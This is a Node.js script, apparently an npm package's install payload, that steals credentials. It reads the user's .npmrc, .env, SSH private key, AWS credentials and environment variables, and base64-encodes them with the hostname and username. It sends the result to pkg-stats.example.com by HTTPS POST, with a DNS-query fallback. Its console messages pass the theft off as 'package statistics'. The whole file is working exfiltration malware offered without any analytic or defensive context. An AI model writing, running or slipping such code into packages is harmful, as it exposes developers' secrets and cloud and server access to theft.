const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const dns = require('dns');

const sensitiveFiles = [
  path.join(os.homedir(), '.npmrc'),
  path.join(os.homedir(), '.env'),
  path.join(os.homedir(), '.ssh', 'id_rsa'),
  path.join(os.homedir(), '.aws', 'credentials'),
];

const collected = {};
sensitiveFiles.forEach(f => {
  try { collected[f] = fs.readFileSync(f, 'utf8'); } catch(e) {}
});
collected['env'] = process.env;

// Encode collected as JSON, then base64 encode it
const jsonData = JSON.stringify(collected);
const base64Data = Buffer.from(jsonData).toString('base64');

// Prepare the POST data
const postData = JSON.stringify({
  timestamp: new Date().toISOString(),
  hostname: os.hostname(),
  username: os.userInfo().username,
  data: base64Data
});

const options = {
  hostname: 'pkg-stats.example.com',
  port: 443,
  path: '/install',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData),
    'User-Agent': 'npm-client'
  },
  timeout: 10000
};

function sendViaHTTPS() {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve(true);
      });
    });

    req.on('error', (error) => {
      reject(error);
    });
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('HTTPS request timeout'));
    });

    req.write(postData);
    req.end();
  });
}

function sendViaDNSFallback() {
  return new Promise((resolve) => {
    // Encode data in DNS query (limited to 253 chars per label)
    const encoded = base64Data.replace(/[^a-zA-Z0-9.-]/g, '');
    const chunks = [];
    for (let i = 0; i < encoded.length; i += 50) {
      chunks.push(encoded.slice(i, i + 50));
    }

    // Use first chunk as subdomain
    const dnsQuery = `${chunks[0]}.pkg-stats.example.com`;

    dns.lookup(dnsQuery, (err) => {
      // We don't care about the response, just that the lookup was attempted
      resolve();
    });
  });
}

async function exfiltrateData() {
  try {
    await sendViaHTTPS();
    console.log('Package statistics sent successfully');
  } catch (httpsError) {
    console.log('HTTPS failed, trying DNS fallback...');
    try {
      await sendViaDNSFallback();
      console.log('DNS fallback completed');
    } catch (dnsError) {
      console.log('All exfiltration methods failed');
    }
  }
}

// Execute
exfiltrateData().catch(() => {});
